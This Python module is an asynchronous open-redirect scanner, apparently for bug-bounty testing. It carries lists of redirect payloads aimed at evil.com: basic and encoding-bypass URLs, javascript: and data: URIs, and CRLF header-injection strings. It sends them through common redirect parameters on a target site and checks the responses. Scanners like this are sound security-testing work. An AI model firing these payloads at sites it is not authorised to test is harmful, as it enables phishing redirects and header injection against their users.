#!/usr/bin/env python3
"""
Module 10: Open Redirect Scanner
4 Layer open redirect detection | Waktu: 15-20 menit | Akurasi: 90%
Mendeteksi: Basic redirect, Bypass techniques, DOM-based redirect, Header injection

MODIFIED: Added external HTTPClient support for X-Bug-Bounty header
"""

import asyncio
import re
import time
import urllib.parse
from typing import List, Dict, Optional
from core.http_client import HTTPClient
from core.logger import Logger

logger = Logger()

class OpenRedirectScanner:
    def __init__(self, target: str, threads: int = 60, timeout: int = 4, client: HTTPClient = None):
        self.target = target.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.client = client  # External client with X-Bug-Bounty header
        self.findings: List[Dict] = []
        self.stats = {
            'endpoints_tested': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0
        }
        
        # ============ PARAMETERS ============
        self.redirect_params = [
            'redirect', 'redirect_uri', 'redirect_url', 'return', 'return_to',
            'next', 'continue', 'goto', 'callback', 'callback_url', 'url',
            'link', 'href', 'dest', 'destination', 'forward', 'to',
            'out', 'view', 'return_path', 'fallback', 'target', 'reference',
            'location', 'redirect_to', 'return_url'
        ]
        
        # ============ LAYER 1: BASIC PAYLOADS ============
        self.basic_payloads = [
            'https://evil.com',
            'http://evil.com',
            '//evil.com',
            '///evil.com',
            'https://evil.com/@',
            '/\\evil.com',
            'evil.com',
            'https://evil.com%2F@',
        ]
        
        # ============ LAYER 2: BYPASS PAYLOADS ============
        self.bypass_payloads = [
            'https://evil%2Ecom',
            'https:%2F%2Fevil.com',
            'https%3A%2F%2Fevil.com',
            'https://evil.com@legitimate.com',
            'https://legitimate.com@evil.com',
            'https://evil.com#@legitimate.com',
            'https://evil.com?legitimate.com',
            'https://127.0.0.1',
            'https://2130706433',
            'https://0x7f000001',
        ]
        
        # ============ LAYER 3: DOM-BASED PAYLOADS ============
        self.dom_payloads = [
            'javascript:location.href="https://evil.com"',
            'javascript:window.location="https://evil.com"',
            'javascript:document.location="https://evil.com"',
            'javascript:location.assign("https://evil.com")',
            'data:text/html,<script>location.href="https://evil.com"</script>',
        ]
        
        # ============ LAYER 4: HEADER INJECTION ============
        self.header_payloads = [
            'https://evil.com%0d%0aLocation:https://legitimate.com',
            'https://evil.com%0d%0aHost:legitimate.com',
        ]
        
        # Evil patterns
        self.evil_patterns = ['evil.com', '127.0.0.1', '2130706433', '0x7f000001']
    
    async def _get_client(self):
        """Get HTTP client - use external if available, otherwise create new"""
        if self.client:
            return self.client
        else:
            return HTTPClient(self.target, timeout=self.timeout, retries=1)
    
    async def test_redirect(self, endpoint: str, param: str, payload: str) -> Optional[Dict]:
        """Test open redirect"""
        client = await self._get_client()
        url = f"{endpoint}?{param}={urllib.parse.quote(payload, safe='')}"
        
        if not hasattr(client, 'session') or client.session is None:
            async with client as ctx_client:
                response = await ctx_client.get(url)
                if response and response.status in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    for evil in self.evil_patterns:
                        if evil in location:
                            return {
                                "vulnerable": True,
                                "type": "OPEN_REDIRECT",
                                "severity": "medium",
                                "confidence": 95,
                                "endpoint": endpoint,
                                "parameter": param,
                                "payload": payload[:80],
                                "redirect_location": location[:100]
                            }
        else:
            response = await client.get(url)
            if response and response.status in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                for evil in self.evil_patterns:
                    if evil in location:
                        return {
                            "vulnerable": True,
                            "type": "OPEN_REDIRECT",
                            "severity": "medium",
                            "confidence": 95,
                            "endpoint": endpoint,
                            "parameter": param,
                            "payload": payload[:80],
                            "redirect_location": location[:100]
                        }
        
        return None
    
    async def test_dom_redirect(self, endpoint: str, param: str, payload: str) -> Optional[Dict]:
        """Test DOM-based redirect"""
        client = await self._get_client()
        url = f"{endpoint}?{param}={urllib.parse.quote(payload, safe='')}"
        
        if not hasattr(client, 'session') or client.session is None:
            async with client as ctx_client:
                response = await ctx_client.get(url)
                if response and response.status == 200:
                    body = await response.text()
                    js_patterns = [
                        r'location\.href\s*=\s*["\']([^"\']+)',
                        r'window\.location\s*=\s*["\']([^"\']+)',
                        r'location\.assign\(["\']([^"\']+)',
                    ]
                    for pattern in js_patterns:
                        matches = re.findall(pattern, body, re.IGNORECASE)
                        for match in matches:
                            for evil in self.evil_patterns:
                                if evil in match:
                                    return {
                                        "vulnerable": True,
                                        "type": "DOM_REDIRECT",
                                        "severity": "medium",
                                        "confidence": 80,
                                        "endpoint": endpoint,
                                        "parameter": param,
                                        "payload": payload[:80]
                                    }
        else:
            response = await client.get(url)
            if response and response.status == 200:
                body = await response.text()
                js_patterns = [
                    r'location\.href\s*=\s*["\']([^"\']+)',
                    r'window\.location\s*=\s*["\']([^"\']+)',
                    r'location\.assign\(["\']([^"\']+)',
                ]
                for pattern in js_patterns:
                    matches = re.findall(pattern, body, re.IGNORECASE)
                    for match in matches:
                        for evil in self.evil_patterns:
                            if evil in match:
                                return {
                                    "vulnerable": True,
                                    "type": "DOM_REDIRECT",
                                    "severity": "medium",
                                    "confidence": 80,
                                    "endpoint": endpoint,
                                    "parameter": param,
                                    "payload": payload[:80]
                                }
        
        return None
    
    async def test_header_injection(self, endpoint: str, param: str, payload: str) -> Optional[Dict]:
        """Test header injection"""
        client = await self._get_client()
        url = f"{endpoint}?{param}={urllib.parse.quote(payload, safe='')}"
        
        if not hasattr(client, 'session') or client.session is None:
            async with client as ctx_client:
                response = await ctx_client.get(url)
                if response:
                    location = response.headers.get('Location', '')
                    if 'evil.com' in location:
                        return {
                            "vulnerable": True,
                            "type": "HEADER_INJECTION",
                            "severity": "high",
                            "confidence": 85,
                            "endpoint": endpoint,
                            "parameter": param,
                            "payload": payload[:80]
                        }
        else:
            response = await client.get(url)
            if response:
                location = response.headers.get('Location', '')
                if 'evil.com' in location:
                    return {
                        "vulnerable": True,
                        "type": "HEADER_INJECTION",
                        "severity": "high",
                        "confidence": 85,
                        "endpoint": endpoint,
                        "parameter": param,
                        "payload": payload[:80]
                    }
        
        return None
    
    async def scan_endpoint(self, endpoint: str) -> List[Dict]:
        """Scan single endpoint - optimized"""
        
        findings = []
        semaphore = asyncio.Semaphore(self.threads)
        
        async def test(param: str, payload: str, test_type: str):
            async with semaphore:
                if test_type == "basic":
                    result = await self.test_redirect(endpoint, param, payload)
                elif test_type == "dom":
                    result = await self.test_dom_redirect(endpoint, param, payload)
                elif test_type == "header":
                    result = await self.test_header_injection(endpoint, param, payload)
                else:
                    return None
                
                if result:
                    findings.append(result)
                    self.stats['vulnerabilities_found'] += 1
                    icon = "🔴" if result.get('severity') == 'high' else "🟠"
                    logger.info(f"{icon} {result['type']} on {endpoint} via {param}: {payload[:60]}")
                    return True
            return False
        
        for param in self.redirect_params:
            found = False
            
            # Basic payloads
            for payload in self.basic_payloads:
                self.stats['payloads_tested'] += 1
                found = await test(param, payload, "basic")
                if found:
                    break
                await asyncio.sleep(0.01)
            
            if found:
                continue
            
            # Bypass payloads
            for payload in self.bypass_payloads:
                self.stats['payloads_tested'] += 1
                found = await test(param, payload, "basic")
                if found:
                    break
                await asyncio.sleep(0.01)
            
            if found:
                continue
            
            # DOM payloads
            for payload in self.dom_payloads:
                self.stats['payloads_tested'] += 1
                found = await test(param, payload, "dom")
                if found:
                    break
                await asyncio.sleep(0.01)
            
            if found:
                continue
            
            # Header injection
            for payload in self.header_payloads:
                self.stats['payloads_tested'] += 1
                found = await test(param, payload, "header")
                if found:
                    break
                await asyncio.sleep(0.01)
        
        return findings
    
    async def scan(self, custom_endpoints: List[str] = None) -> Dict:
        """Full open redirect scanner"""
        
        if custom_endpoints:
            endpoints = custom_endpoints
        else:
            endpoints = ["/", "/redirect", "/goto", "/link", "/api/redirect", "/auth", "/login"]
        
        total_tests = len(endpoints) * len(self.redirect_params) * (
            len(self.basic_payloads) + len(self.bypass_payloads) + 
            len(self.dom_payloads) + len(self.header_payloads)
        )
        
        logger.info(f"\n{'='*60}")
        logger.info(f"🚀 DRYBT - OPEN REDIRECT SCANNER")
        logger.info(f"{'='*60}")
        logger.info(f"🎯 Target: {self.target}")
        logger.info(f"📡 Endpoints: {len(endpoints)}")
        logger.info(f"📊 Parameters: {len(self.redirect_params)}")
        logger.info(f"📈 Total tests: {total_tests:,}")
        logger.info(f"🔧 Threads: {self.threads} | Timeout: {self.timeout}s")
        logger.info(f"⏱️  Estimated time: 15-20 minutes")
        logger.info(f"{'='*60}\n")
        
        start_time = time.time()
        
        for endpoint in endpoints:
            logger.info(f"\n📡 Testing: {endpoint}")
            findings = await self.scan_endpoint(endpoint)
            self.findings.extend(findings)
            self.stats['endpoints_tested'] += 1
            
            elapsed = time.time() - start_time
            logger.info(f"  ✅ Done: {endpoint} - {len(findings)} findings | {elapsed/60:.1f}m elapsed")
        
        elapsed = time.time() - start_time
        
        print(f"\n{'='*60}")
        print(f"📊 OPEN REDIRECT SCAN SUMMARY")
        print(f"{'='*60}")
        print(f"⏱️  Time: {elapsed:.2f}s ({elapsed/60:.1f}m)")
        print(f"📡 Endpoints: {self.stats['endpoints_tested']}")
        print(f"📊 Payloads: {self.stats['payloads_tested']}")
        print(f"🎯 Findings: {len(self.findings)}")
        
        if self.findings:
            print(f"\n🔴 VULNERABLE PARAMETERS:")
            for f in self.findings[:10]:
                print(f"   ⚡ {f['parameter']} | {f.get('payload', '')[:50]}")
        
        print(f"\n{'='*60}")
        
        rating = "🔴 OPEN REDIRECT FOUND!" if self.findings else "✅ SECURE - No open redirect detected"
        print(f"📈 Result: {rating}")
        print(f"{'='*60}\n")
        
        return {
            "module": "open_redirect",
            "mode": "balanced",
            "target": self.target,
            "scan_time_minutes": round(elapsed/60, 1),
            "endpoints_tested": self.stats['endpoints_tested'],
            "payloads_tested": self.stats['payloads_tested'],
            "vulnerabilities_found": len(self.findings),
            "findings": self.findings
        }


# ================================================================
# MAIN RUN FUNCTION - MODIFIED FOR EXTERNAL CLIENT
# ================================================================
async def run(target: str, custom_endpoints: List[str] = None, client: HTTPClient = None) -> Dict:
    """
    Run open redirect scanner - DRYBT OPEN REDIRECT SCANNER
    
    Args:
        target: Target URL
        custom_endpoints: Custom endpoints to test (optional)
        client: Optional external HTTPClient (for X-Bug-Bounty header)
    """
    scanner = OpenRedirectScanner(target, client=client)
    return await scanner.scan(custom_endpoints)